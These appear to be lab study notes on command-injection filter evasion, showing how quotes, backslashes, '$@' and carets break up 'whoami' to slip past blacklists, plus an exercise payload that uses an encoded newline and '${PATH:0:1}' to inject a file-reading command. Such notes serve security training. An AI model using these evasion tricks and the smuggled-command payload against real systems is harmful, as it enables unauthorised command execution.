# Bypassing Blacklisted Commands

## Linux & Windows
Using single and double quotes (`'` and `"`)
```
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```
```
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

## Linux
Insert backslash `\` and/or `$@`
```
who$@ami
w\ho\am\i
```

## Windows
Insert caret `^`
```
C:\htb> who^ami

21y4d
```

Exercise payload: <br>
`127.0.0.1%0a{ca't',${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}`
